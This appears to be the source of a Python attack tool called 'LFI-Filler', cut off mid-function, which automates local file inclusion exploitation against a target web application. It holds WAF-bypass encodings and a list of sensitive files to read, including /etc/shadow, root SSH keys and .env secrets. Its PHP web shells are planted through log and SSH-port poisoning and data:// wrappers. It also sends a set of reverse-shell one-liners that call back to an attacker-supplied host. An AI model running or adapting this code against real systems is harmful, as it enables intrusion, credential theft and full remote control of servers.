#!/usr/bin/env python3
"""
LFI-FILLER: COMPREHENSIVE LFI CHECKER WITH ENCODING BYPASS
Advanced LFI scanner with encoding bypasses and web shell deployment
"""
import requests
import urllib.parse
import base64
import sys
import time
import re
import socket
import subprocess
import argparse

class LFI_Filler:
    def __init__(self, url, lhost=None, lport=4444, timeout=5, workers=20, 
                 custom_param=None, webshell=False, encode=None):
        self.url = url.rstrip('/')
        self.lhost = lhost
        self.lport = lport
        self.timeout = timeout
        self.workers = workers
        self.custom_param = custom_param
        self.webshell = webshell
        self.encode = encode  # None, 'url', 'double', 'unicode', 'all'
        
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        
        self.results = {
            'lfi_params': [],
            'php_wrappers': [],
            'readable_files': [],
            'log_poisoning': [],
            'ssh_poisoning': False,
            'rfi': False,
            'webshell_created': False,
            'webshell_urls': []
        }
        
        self._load_payloads()
    
    def _encode_payload(self, payload):
        """Apply encoding to bypass WAF"""
        if not self.encode:
            return payload
        
        if self.encode == 'url':
            return urllib.parse.quote(payload)
        
        elif self.encode == 'double':
            return urllib.parse.quote(urllib.parse.quote(payload))
        
        elif self.encode == 'unicode':
            # Unicode encoding for path traversal
            encoded = payload.replace('/', '%c0%af')
            encoded = encoded.replace('\\', '%c1%9c')
            encoded = encoded.replace('.', '%c0%ae')
            return encoded
        
        elif self.encode == 'all':
            # Try multiple encodings
            encodings = [
                payload,  # Original
                urllib.parse.quote(payload),  # URL encode
                urllib.parse.quote(urllib.parse.quote(payload)),  # Double URL encode
                payload.replace('/', '%c0%af').replace('\\', '%c1%9c'),  # Unicode
                payload.replace('/', '..%252f'),  # Double encoded slashes
                payload.replace('/', '....//'),  # Dot dot slash
                payload.replace('/', '..;/'),  # Semicolon bypass
                payload + '%00',  # Null byte
                payload + '%00.jpg',  # Null byte with extension
            ]
            return encodings
        
        return payload
    
    def _build_url(self, param, value):
        """Build URL with optional encoding"""
        if self.encode == 'all':
            # For 'all' encoding, return multiple URLs
            encoded_values = self._encode_payload(value)
            urls = []
            for encoded in encoded_values:
                if '?' in self.url:
                    urls.append(f"{self.url}&{param}={encoded}")
                else:
                    urls.append(f"{self.url}?{param}={encoded}")
            return urls
        else:
            encoded_value = self._encode_payload(value)
            if '?' in self.url:
                return f"{self.url}&{param}={encoded_value}"
            else:
                return f"{self.url}?{param}={encoded_value}"
    
    def _load_payloads(self):
        self.lfi_params = [
            'file', 'page', 'path', 'load', 'include', 'doc', 'view', 'template',
            'f', 'p', 'filename', 'name', 'input', 'src', 'lang', 'module',
            'cat', 'dir', 'action', 'board', 'date', 'detail', 'download',
            'prefix', 'include_path', 'mod', 'show', 'data', 'loc',
            'read', 'ret', 'target', 'text', 'file_name', 'file_path',
            'menu', 'content', 'document_root', 'site', 'nav', 'next',
            'open', 'option', 'preview', 'route', 'section', 'selection',
            'settings', 'source', 'subject', 'theme', 'url', 'wp',
            'controller', 'action', 'method', 'format', 'layout',
            'component', 'itemid', 'task',
            'endpoint', 'resource', 'uri'
        ]
        
        # Add custom parameter if provided
        if self.custom_param:
            self.lfi_params = [self.custom_param]
            print(f"[*] Using custom parameter: {self.custom_param} (solo mode)")
        
        # Base LFI payloads
        self.lfi_payloads_base = [
            '/etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '....//....//....//....//etc/passwd',
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '/etc/passwd%00.txt',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '../../../../windows/system32/drivers/etc/hosts',
            'index.php', 'file.php', 'page.php',
            '/var/log/auth.log',
            '/proc/self/environ'
        ]
        
        # Generate encoded payloads based on encoding mode
        self.lfi_payloads = []
        for payload in self.lfi_payloads_base:
            if self.encode == 'all':
                encoded_versions = self._encode_payload(payload)
                self.lfi_payloads.extend(encoded_versions)
            else:
                self.lfi_payloads.append(self._encode_payload(payload))
        
        self.php_wrappers = [
            ('php://filter/convert.base64-encode/resource=/etc/passwd', 'Base64 Filter'),
            ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'Base64 Read'),
            ('php://filter/string.rot13/resource=/etc/passwd', 'Rot13 Filter'),
            ('php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd', 'Iconv Filter'),
            ('data://text/plain,<?php echo "TEST"; ?>', 'Data Wrapper'),
            ('data://text/plain;base64,PD9waHAgZWNobyAiVEVTVCI7ID8+', 'Data Base64'),
            ('php://input', 'PHP Input'),
            ('expect://whoami', 'Expect Wrapper'),
            ('zip:///etc/passwd%23test', 'Zip Wrapper'),
            ('phar:///etc/passwd', 'Phar Wrapper')
        ]
        
        self.interesting_files = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
            '/etc/ssh/sshd_config', '/etc/sudoers', '/etc/crontab',
            '/etc/apache2/apache2.conf', '/etc/nginx/nginx.conf',
            '/etc/php/7.4/apache2/php.ini', '/etc/php/8.0/apache2/php.ini', '/etc/php/8.1/apache2/php.ini', '/etc/php/8.2/apache2/php.ini',
            '/etc/mysql/my.cnf', '/etc/postgresql/postgresql.conf',
            '/var/www/html/config.php', '/var/www/html/wp-config.php',
            '/var/www/html/.env', '/var/www/html/settings.php',
            '/var/www/html/database.php', '/var/www/html/web.config',
            '/var/log/auth.log', '/var/log/apache2/access.log',
            '/var/log/apache2/error.log', '/var/log/nginx/access.log',
            '/var/log/syslog', '/proc/self/environ',
            '/root/.bash_history', '/root/.ssh/id_rsa',
            '/home/root/.bash_history', '/home/root/.ssh/id_rsa',
            '/home/www-data/.bash_history', '/home/www-data/.ssh/id_rsa',
            'config.php.bak', 'database.php.old', '.env.backup',
            '/proc/self/cmdline', '/proc/version', '/proc/mounts'
        ]
        
        # Web shells
        self.webshells = {
            'php_simple': '<?php system($_GET["cmd"]); ?>',
            'php_advanced': '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
            'php_backdoor': '<?php eval($_POST["pass"]); ?>',
            'php_base64': '<?php if(isset($_GET["x"])){ eval(base64_decode($_GET["x"])); } ?>',
            'php_one_liner': '<?=`$_GET[0]`?>',
            'php_small': '<?=system($_GET[0]);?>'
        }
    
    def check_lfi(self):
        print(f"[*] Checking {len(self.lfi_params)} parameters with {self.encode or 'no'} encoding...")
        
        # Only extract URL params if not in custom param mode
        url_params = []
        if not self.custom_param and '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    url_params.append(param.split('=')[0])
        
        all_params = list(set(self.lfi_params + url_params))
        found = []
        
        for param in all_params:
            for payload in self.lfi_payloads:
                if self.encode == 'all':
                    test_urls = self._build_url(param, '/etc/passwd')
                    for test_url in test_urls:
                        try:
                            r = requests.get(test_url, timeout=self.timeout, headers=self.session.headers)
                            if self._check_lfi_response(r):
                                print(f"[+] LFI: {param} (encoded)")
                                found.append({
                                    'param': param,
                                    'payload': '/etc/passwd',
                                    'url': test_url,
                                    'encoding': 'multiple'
                                })
                                break
                        except:
                            continue
                    if found and found[-1]['param'] == param:
                        break
                else:
                    test_url = self._build_url(param, payload)
                    try:
                        r = requests.get(test_url, timeout=self.timeout, headers=self.session.headers)
                        if self._check_lfi_response(r):
                            print(f"[+] LFI: {param}={payload}")
                            found.append({
                                'param': param,
                                'payload': payload,
                                'url': test_url,
                                'encoding': self.encode
                            })
                            break
                    except:
                        continue
        
        self.results['lfi_params'] = found
        return found
    
    def _check_lfi_response(self, response):
        """Check if response contains LFI indicators"""
        if response.status_code != 200:
            return False
        
        content = response.text
        # Check for /etc/passwd content
        if 'root:x:' in content or 'daemon:x:' in content or 'bin:x:' in content:
            if not any(err in content.lower() for err in ['error', 'warning', 'not found', 'forbidden', 'access denied']):
                return True
        
        # Check for Windows hosts file
        if 'localhost' in content and '127.0.0.1' in content and 'hosts' in response.url:
            return True
        
        # Check for PHP source code
        if '<?php' in content and ('include' in content or 'require' in content):
            return True
        
        return False
    
    def check_php_wrappers(self, param):
        if not param:
            return []
            
        print(f"[*] Testing PHP wrappers with {self.encode or 'no'} encoding...")
        working = []
        
        for wrapper, name in self.php_wrappers:
            if self.encode == 'all':
                # Test wrapper with multiple encodings
                encoded_wrappers = self._encode_payload(wrapper)
                for encoded_wrapper in encoded_wrappers:
                    test_url = f"{self.url}?{param}={encoded_wrapper}" if '?' not in self.url else f"{self.url}&{param}={encoded_wrapper}"
                    if self._test_wrapper(test_url, wrapper, name):
                        working.append((name, wrapper, test_url))
                        break
            else:
                encoded_wrapper = self._encode_payload(wrapper)
                test_url = self._build_url(param, encoded_wrapper) if not isinstance(encoded_wrapper, list) else f"{self.url}?{param}={encoded_wrapper[0]}"
                if self._test_wrapper(test_url, wrapper, name):
                    working.append((name, wrapper, test_url))
        
        self.results['php_wrappers'] = working
        return working
    
    def _test_wrapper(self, test_url, wrapper, name):
        """Test a PHP wrapper"""
        try:
            if wrapper == "php://input":
                r = requests.post(test_url, data='<?php echo "WRAPPER_TEST"; ?>', 
                                  timeout=self.timeout, headers=self.session.headers)
            else:
                r = requests.get(test_url, timeout=self.timeout, headers=self.session.headers)
            
            if r and r.status_code == 200:
                if wrapper.startswith("php://filter"):
                    try:
                        # Try to decode base64
                        decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
                        if 'root:x:' in decoded or '<?php' in decoded:
                            print(f"[+] {name} works")
                            return True
                    except:
                        # Check for ROT13
                        if 'nff' in r.text.lower() or 'uggc' in r.text.lower():
                            print(f"[+] {name} works (ROT13 detected)")
                            return True
                elif wrapper.startswith("data://"):
                    if 'WRAPPER_TEST' in r.text or 'TEST' in r.text:
                        print(f"[+] {name} works")
                        return True
                elif wrapper == "php://input":
                    if 'WRAPPER_TEST' in r.text:
                        print(f"[+] {name} works")
                        return True
                elif wrapper.startswith("expect://") or wrapper.startswith("phar://") or wrapper.startswith("zip://"):
                    if r.text and len(r.text.strip()) > 0:
                        print(f"[+] {name} might work")
                        return True
        except Exception as e:
            pass
        return False
    
    def enumerate_files(self, param):
        if not param:
            return []
            
        print(f"[*] Enumerating files with {self.encode or 'no'} encoding...")
        found = []
        
        for file_path in self.interesting_files:
            if self.encode == 'all':
                test_urls = self._build_url(param, file_path)
                for test_url in test_urls:
                    try:
                        r = requests.get(test_url, timeout=self.timeout, headers=self.session.headers)
                        if self._check_file_readable(r, file_path):
                            print(f"[+] Readable: {file_path} (encoded)")
                            found.append((file_path, r.text[:500], test_url))
                            break
                    except:
                        pass
            else:
                test_url = self._build_url(param, file_path)
                try:
                    r = requests.get(test_url, timeout=self.timeout, headers=self.session.headers)
                    if self._check_file_readable(r, file_path):
                        print(f"[+] Readable: {file_path}")
                        found.append((file_path, r.text[:500], test_url))
                except:
                    pass
        
        self.results['readable_files'] = found
        return found
    
    def _check_file_readable(self, response, file_path):
        """Check if file is readable"""
        if response.status_code != 200:
            return False
        
        content = response.text.strip()
        if not content or len(content) < 10:
            return False
        
        # Skip error messages
        error_keywords = ['error', 'not found', 'no such', 'forbidden', 'access denied', 'warning']
        if any(err in content.lower() for err in error_keywords):
            return False
        
        # Check for specific file patterns
        if '/etc/passwd' in file_path and 'root:x:' in content:
            return True
        if '/etc/shadow' in file_path and 'root:' in content and '$' in content:
            return True
        if 'config' in file_path.lower() and ('password' in content.lower() or 'database' in content.lower()):
            return True
        if '.env' in file_path and ('=' in content or ':' in content):
            return True
        if 'log' in file_path and (len(content) > 100 or 'GET' in content or 'POST' in content):
            return True
        
        # Generic check for any meaningful content
        if len(content) > 50 and not content.startswith('<') and 'html' not in content.lower():
            return True
        
        return False
    
    def check_log_poisoning(self, param):
        if not param:
            return []
            
        print(f"[*] Checking log poisoning with {self.encode or 'no'} encoding...")
        
        logs = ['/var/log/auth.log', '/var/log/apache2/access.log', 
                '/var/log/apache2/error.log', '/proc/self/environ',
                '/var/log/nginx/access.log', '/var/log/nginx/error.log']
        
        readable_logs = []
        
        for log in logs:
            if self.encode == 'all':
                test_urls = self._build_url(param, log)
                for test_url in test_urls:
                    try:
                        r = requests.get(test_url, timeout=self.timeout, headers=self.session.headers)
                        if r.status_code == 200 and len(r.text) > 50:
                            readable_logs.append({'log': log, 'url': test_url})
                            print(f"[+] Readable log: {log} (encoded)")
                            break
                    except:
                        continue
            else:
                test_url = self._build_url(param, log)
                try:
                    r = requests.get(test_url, timeout=self.timeout, headers=self.session.headers)
                    if r.status_code == 200 and len(r.text) > 50:
                        readable_logs.append({'log': log, 'url': test_url})
                        print(f"[+] Readable log: {log}")
                except:
                    continue
        
        if not readable_logs:
            return []
        
        successful = []
        
        for log_info in readable_logs:
            log = log_info['log']
            log_url = log_info['url']
            print(f"[*] Testing poisoning on {log}...")
            
            poison_methods = [
                ('User-Agent', {'User-Agent': '<?php system($_GET["cmd"]); ?>'}),
                ('Referer', {'Referer': '<?php echo shell_exec($_GET["c"]); ?>'}),
                ('X-Forwarded-For', {'X-Forwarded-For': '<?php passthru($_GET["exec"]); ?>'}),
                ('X-Real-IP', {'X-Real-IP': '<?php echo `$_GET["x"]`; ?>'})
            ]
            
            for method, headers in poison_methods:
                base_url = self.url.split('?')[0]
                try:
                    # Send poisoning request
                    poison_headers = {**self.session.headers, **headers}
                    requests.get(base_url, headers=poison_headers, timeout=2)
                    time.sleep(2)
                    
                    # Check if poisoned
                    r = requests.get(log_url, timeout=self.timeout, headers=self.session.headers)
                    
                    if r and '<?php' in r.text:
                        print(f"[+] Poisoned via {method}")
                        
                        # Test RCE
                        test_cmd = "echo POISON_TEST_$(date +%s)"
                        for cmd_param in ['cmd', 'c', 'exec', 'x']:
                            test_url = f"{log_url}&{cmd_param}={urllib.parse.quote(test_cmd)}"
                            try:
                                r = requests.get(test_url, timeout=3, headers=self.session.headers)
                                if r and 'POISON_TEST_' in r.text:
                                    print(f"[+] RCE via {cmd_param}")
                                    successful.append({
                                        'log': log,
                                        'method': method,
                                        'param': cmd_param,
                                        'url': log_url
                                    })
                                    break
                            except:
                                continue
                except:
                    continue
        
        self.results['log_poisoning'] = successful
        return successful
    
    def check_ssh_poisoning(self, param, log_file='/var/log/auth.log'):
        if not param:
            return False
            
        print(f"[*] Checking SSH log poisoning with {self.encode or 'no'} encoding...")
        
        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', self.url)
        if not ip_match:
            return False
            
        target_ip = ip_match.group(0)
        php_code = '<?php system($_GET["ssh_cmd"]); ?>'
        
        sent = False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, 22))
            sock.sendall(f'{php_code}\r\n'.encode())
            sock.close()
            sent = True
            print(f"[*] Sent PHP code to SSH port")
        except:
            try:
                cmd = f'echo "{php_code}" | timeout 2 nc {target_ip} 22'
                subprocess.run(cmd, shell=True, capture_output=True)
                sent = True
                print(f"[*] Sent PHP code to SSH port via nc")
            except:
                pass
        
        if not sent:
            print("[-] Could not connect to SSH port")
            return False
        
        time.sleep(3)
        
        # Test with multiple encodings
        if self.encode == 'all':
            test_urls = self._build_url(param, log_file)
            for test_url in test_urls:
                test_url_with_cmd = f"{test_url}&ssh_cmd=echo+SSH_TEST_$(date +%s)"
                try:
                    r = requests.get(test_url_with_cmd, timeout=5, headers=self.session.headers)
                    if r and 'SSH_TEST_' in r.text:
                        print("[+] SSH log poisoning successful! (encoded)")
                        self.results['ssh_poisoning'] = True
                        return True
                except:
                    pass
        else:
            test_url = self._build_url(param, log_file)
            test_url_with_cmd = f"{test_url}&ssh_cmd=echo+SSH_TEST_$(date +%s)"
            try:
                r = requests.get(test_url_with_cmd, timeout=5, headers=self.session.headers)
                if r and 'SSH_TEST_' in r.text:
                    print("[+] SSH log poisoning successful!")
                    self.results['ssh_poisoning'] = True
                    return True
            except:
                pass
        
        return False
    
    def check_rfi(self, param):
        if not param or not self.lhost:
            return False
            
        print(f"[*] Checking RFI with {self.encode or 'no'} encoding...")
        
        test_urls = [
            f'http://{self.lhost}:8000/test.php',
            f'\\\\{self.lhost}\\share\\test.php',
            f'//{self.lhost}/test.txt',
            f'http://{self.lhost}/test.php',
            f'ftp://{self.lhost}/test.txt'
        ]
        
        for rfi_url in test_urls:
            if self.encode == 'all':
                encoded_urls = self._encode_payload(rfi_url)
                for encoded_url in encoded_urls:
                    test_url = f"{self.url}?{param}={encoded_url}" if '?' not in self.url else f"{self.url}&{param}={encoded_url}"
                    try:
                        r = requests.get(test_url, timeout=5, headers=self.session.headers)
                        if r.status_code == 200:
                            print(f"[+] RFI might work (encoded): {rfi_url}")
                            self.results['rfi'] = True
                            return True
                    except:
                        continue
            else:
                encoded_url = self._encode_payload(rfi_url)
                test_url = self._build_url(param, encoded_url) if not isinstance(encoded_url, list) else f"{self.url}?{param}={encoded_url[0]}"
                try:
                    r = requests.get(test_url, timeout=5, headers=self.session.headers)
                    if r.status_code == 200:
                        print(f"[+] RFI might work: {rfi_url}")
                        self.results['rfi'] = True
                        return True
                except:
                    continue
        
        return False
    
    def create_webshell(self, param):
        """Attempt to create a web shell on the target"""
        if not param or not self.webshell:
            return False
            
        print(f"\n[*] Attempting to create web shells with {self.encode or 'no'} encoding...")
        print("[*] This may take a moment...")
        
        # Common web shell locations (prioritize common ones)
        shell_locations = [
            '/var/www/html/shell.php',
            '/tmp/shell.php',
            '/dev/shm/shell.php',
            'shell.php',
            '/var/tmp/shell.php',
            './shell.php',
            '/var/www/html/tmp/shell.php',
            '/var/www/html/uploads/shell.php'
        ]
        
        created_shells = []
        max_attempts = 20  # Limit total attempts to prevent hanging
        attempt_count = 0
        
        # Simple web shell code (most reliable)
        simple_shell = '<?php system($_GET["cmd"]); ?>'
        
        # Try via log poisoning first (most reliable)
        if self.results.get('log_poisoning'):
            print("[*] Trying log poisoning method...")
            for poison in self.results['log_poisoning']:
                for location in shell_locations[:3]:  # Try only first 3 locations
                    attempt_count += 1
                    if attempt_count > max_attempts:
                        print("[!] Reached maximum attempts, stopping web shell creation")
                        break
                    
                    # Create shell using echo command
                    echo_cmd = f"echo '{simple_shell}' > {location}"
                    
                    try:
                        # Create shell
                        shell_url = f"{poison['url']}&{poison['param']}={urllib.parse.quote(echo_cmd)}"
                        print(f"[*] Attempt {attempt_count}: Trying {location} via log poisoning")
                        
                        r = requests.get(shell_url, timeout=3, headers=self.session.headers)
                        time.sleep(1)
                        
                        # Check if created
                        if self.encode == 'all':
                            check_urls = self._build_url(param, location)
                            for check_url in check_urls:
                                try:
                                    r_check = requests.get(check_url, timeout=3, headers=self.session.headers)
                                    if r_check.status_code == 200 and ('<?php' in r_check.text or 'system' in r_check.text):
                                        print(f"[+] SUCCESS: Web shell created at {location}")
                                        web_url = self._get_web_url(location)
                                        created_shells.append({
                                            'location': location,
                                            'type': 'php_simple',
                                            'url': web_url,
                                            'access_url': check_url + '?cmd=id',
                                            'method': 'log_poisoning'
                                        })
                                        self.results['webshell_created'] = True
                                        break
                                except:
                                    continue
                        else:
                            check_url = self._build_url(param, location)
                            try:
                                r_check = requests.get(check_url, timeout=3, headers=self.session.headers)
                                if r_check.status_code == 200 and ('<?php' in r_check.text or 'system' in r_check.text):
                                    print(f"[+] SUCCESS: Web shell created at {location}")
                                    web_url = self._get_web_url(location)
                                    created_shells.append({
                                        'location': location,
                                        'type': 'php_simple',
                                        'url': web_url,
                                        'access_url': check_url + '?cmd=id',
                                        'method': 'log_poisoning'
                                    })
                                    self.results['webshell_created'] = True
                            except:
                                pass
                                
                    except Exception as e:
                        continue
                
                if self.results['webshell_created']:
                    break
        
        # Try via SSH poisoning
        if not created_shells and self.results.get('ssh_poisoning'):
            print("[*] Trying SSH poisoning method...")
            for location in shell_locations[:2]:  # Try only first 2 locations
                attempt_count += 1
                if attempt_count > max_attempts:
                    print("[!] Reached maximum attempts, stopping web shell creation")
                    break
                
                # Create shell using echo command
                echo_cmd = f"echo '{simple_shell}' > {location}"
                
                try:
                    print(f"[*] Attempt {attempt_count}: Trying {location} via SSH poisoning")
                    shell_url = f"{self._build_url(param, '/var/log/auth.log')}&ssh_cmd={urllib.parse.quote(echo_cmd)}"
                    requests.get(shell_url, timeout=3, headers=self.session.headers)
                    time.sleep(2)  # Wait longer for SSH
                    
                    # Check if created
                    check_url = self._build_url(param, location)
                    try:
                        r_check = requests.get(check_url, timeout=3, headers=self.session.headers)
                        if r_check.status_code == 200 and ('<?php' in r_check.text or 'system' in r_check.text):
                            print(f"[+] SUCCESS: Web shell created at {location}")
                            web_url = self._get_web_url(location)
                            created_shells.append({
                                'location': location,
                                'type': 'php_simple',
                                'url': web_url,
                                'access_url': check_url + '?cmd=id',
                                'method': 'ssh_poisoning'
                            })
                            self.results['webshell_created'] = True
                            break
                    except:
                        pass
                except:
                    pass
        
        # Try via PHP wrappers (data://)
        if not created_shells:
            print("[*] Trying PHP wrapper method...")
            for name, wrapper, url in self.results.get('php_wrappers', []):
                if 'data://' in wrapper and attempt_count < max_attempts:
                    for location in shell_locations[:2]:
                        attempt_count += 1
                        if attempt_count > max_attempts:
                            break
                        
                        # PHP code to create shell
                        php_code = f'<?php file_put_contents("{location}", \'{simple_shell}\'); ?>'
                        
                        try:
                            print(f"[*] Attempt {attempt_count}: Trying {location} via PHP wrapper")
                            if 'base64' in wrapper:
                                encoded = base64.b64encode(php_code.encode()).decode()
                                payload = f"data://text/plain;base64,{encoded}"
                            else:
                                payload = f"data://text/plain,{urllib.parse.quote(php_code)}"
                            
                            shell_url = self._build_url(param, payload)
                            requests.get(shell_url, timeout=2, headers=self.session.headers)
                            time.sleep(1)
                            
                            # Check if created
                            check_url = self._build_url(param, location)
                            try:
                                r_check = requests.get(check_url, timeout=3, headers=self.session.headers)
                                if r_check.status_code == 200 and ('<?php' in r_check.text or 'system' in r_check.text):
                                    print(f"[+] SUCCESS: Web shell created at {location}")
                                    web_url = self._get_web_url(location)
                                    created_shells.append({
                                        'location': location,
                                        'type': 'php_simple',
                                        'url': web_url,
                                        'access_url': check_url + '?cmd=id',
                                        'method': 'php_wrapper'
                                    })
                                    self.results['webshell_created'] = True
                                    break
                            except:
                                pass
                        except:
                            pass
        
        self.results['webshell_urls'] = created_shells
        
        if created_shells:
            print(f"\n[+] Created {len(created_shells)} web shell(s)")
            for shell in created_shells:
                print(f"    Location: {shell['location']}")
                print(f"    Method: {shell['method']}")
                print(f"    Web URL: {shell['url']}")
                print(f"    Test: {shell['access_url']}")
        else:
            print("[-] Could not create web shell automatically")
            print("[*] Try manual creation with the commands below")
        
        return created_shells
    
    def _get_web_url(self, file_path):
        """Convert file path to web URL"""
        # Extract base URL (remove query string and file.php)
        base_url = self.url.split('?')[0]
        if '/' in base_url:
            # Try to get directory
            if base_url.endswith('.php'):
                base_url = base_url.rsplit('/', 1)[0] + '/'
        
        # Get just the filename
        filename = file_path.split('/')[-1]
        
        # Construct web URL
        if base_url.endswith('/'):
            return base_url + filename
        else:
            return base_url + '/' + filename
    
    def execute_shells(self, param):
        if not self.lhost or not param:
            return
            
        print(f"\n[*] Executing reverse shells to {self.lhost}:{self.lport}")
        print(f"[*] Start listener: nc -lvnp {self.lport}")
        
        shells_sent = 0
        
        reverse_shells = {
            'bash': f'bash -c "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"',
            'python': f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'',
            'python2': f'python2 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
            'nc': f'nc -e /bin/sh {self.lhost} {self.lport}',
            'nc_traditional': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f',
            'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            'perl': f'perl -e \'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            'ruby': f'ruby -rsocket -e\'f=TCPSocket.open("{self.lhost}",{self.lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            'lua': f'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{self.lhost}\',\'{self.lport}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"'
        }
        
        # Send shells via all available methods
        for name, wrapper, url in self.results.get('php_wrappers', []):
            if 'data://' in wrapper:
                for shell_name, shell_template in reverse_shells.items():
                    try:
                        php_code = f'<?php system("{shell_template}"); ?>'
                        if 'base64' in wrapper:
                            encoded = base64.b64encode(php_code.encode()).decode()
                            payload = f"data://text/plain;base64,{encoded}"
                        else:
                            payload = f"data://text/plain,{urllib.parse.quote(php_code)}"
                        
                        shell_url = self._build_url(param, payload)
                        if self.encode == 'all':
                            if isinstance(shell_url, list):
                                for url in shell_url:
                                    requests.get(url, timeout=2, headers=self.session.headers)
                            else:
                                requests.get(shell_url, timeout=2, headers=self.session.headers)
                        else:
                            requests.get(shell_url, timeout=2, headers=self.session.headers)
                        print(f"[+] Sent {shell_name} via wrapper")
                        shells_sent += 1
                        time.sleep(0.5)
                    except:
                        pass
        
        for poison in self.results.get('log_poisoning', []):
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{poison['url']}&{poison['param']}={urllib.parse.quote(shell_template)}"
                    requests.get(shell_url, timeout=2, headers=self.session.headers)
                    print(f"[+] Sent {shell_name} via log poisoning")
                    shells_sent += 1
                    time.sleep(0.5)
                except:
                    pass
        
        if self.results.get('ssh_poisoning'):
            for shell_name, shell_template in reverse_shells.items():
                try:
                    shell_url = f"{self._build_url(param, '/var/log/auth.log')}&ssh_cmd={urllib.parse.quote(shell_template)}"
                    requests.get(shell_url, timeout=2, headers=self.session.headers)
                    print(f"[+] Sent {shell_name} via SSH poisoning")
                    shells_sent += 1
                    time.sleep(0.5)
                except:
                    pass
        
        print(f"\n[*] Sent {shells_sent} reverse shell attempts. Check your listener!")
    
    def show_results(self):
        print("\n" + "="*80)
        print("LFI-FILLER RESULTS")
        print("="*80)
        
        if self.results['lfi_params']:
            print(f"\n[+] LFI PARAMETERS ({len(self.results['lfi_params'])}):")
            for lfi in self.results['lfi_params'][:5]:
                print(f"  Parameter: {lfi['param']}")
                print(f"  Payload: {lfi['payload'][:50]}..." if len(lfi['payload']) > 50 else f"  Payload: {lfi['payload']}")
                print(f"  URL: {lfi['url'][:80]}..." if len(lfi['url']) > 80 else f"  URL: {lfi['url']}")
                if lfi.get('encoding'):
                    print(f"  Encoding: {lfi['encoding']}")
                print()
        
        if self.results['php_wrappers']:
            print(f"\n[+] PHP WRAPPERS ({len(self.results['php_wrappers'])}):")
            for name, wrapper, url in self.results['php_wrappers'][:3]:
                print(f"  {name}:")
                print(f"    Wrapper: {wrapper}")
                print(f"    URL: {url[:80]}..." if len(url) > 80 else f"    URL: {url}")
        
        if self.results['readable_files']:
            print(f"\n[+] READABLE FILES ({len(self.results['readable_files'])}):")
            for file_path, content, url in self.results['readable_files'][:5]:
                print(f"  {file_path}")
                print(f"    Preview: {content[:100]}..." if len(content) > 100 else f"    Preview: {content}")
                print(f"    URL: {url[:80]}..." if len(url) > 80 else f"    URL: {url}")
        
        if self.results['log_poisoning']:
            print(f"\n[+] LOG POISONING ({len(self.results['log_poisoning'])}):")
            for poison in self.results['log_poisoning'][:3]:
                print(f"  Log: {poison['log']}")
                print(f"  Method: {poison['method']}")
                print(f"  Command: {poison['url']}&{poison['param']}=COMMAND")
                print(f"  Example: {poison['url']}&{poison['param']}=id")
        
        if self.results.get('ssh_poisoning'):
            print(f"\n[+] SSH POISONING: SUCCESS")
            if self.results['lfi_params']:
                param = self.results['lfi_params'][0]['param']
                print(f"  Command: {self._build_url(param, '/var/log/auth.log')}&ssh_cmd=COMMAND")
        
        if self.results.get('rfi'):
            print(f"\n[+] RFI: VULNERABLE")
            print(f"  Try: {self.url}?[param]=http://YOUR_IP/test.php")
        
        if self.results.get('webshell_created'):
            print(f"\n[+] WEB SHELLS CREATED ({len(self.results['webshell_urls'])}):")
            for shell in self.results['webshell_urls'][:3]:
                print(f"  Location: {shell['location']}")
                print(f"  Type: {shell['type']}")
                print(f"  Direct URL: {shell['url']}")
                print(f"  Access with: {shell['access_url']}")
        
        print("\n" + "="*80)
        print("MANUAL EXPLOITATION GUIDE")
        print("="*80)
        
        if self.results['lfi_params']:
            param = self.results['lfi_params'][0]['param']
            print(f"\n1. BASIC LFI:")
            print(f"   {self.url}?{param}=FILE_PATH")
            print(f"   Example: {self.url}?{param}=../../../../etc/passwd")
            print(f"   Example: {self.url}?{param}=/proc/self/environ")
        
        if self.results['php_wrappers']:
            print(f"\n2. PHP WRAPPERS:")
            for name, wrapper, url in self.results['php_wrappers'][:2]:
                print(f"   {name}:")
                print(f"     {url}")
                if 'base64' in wrapper:
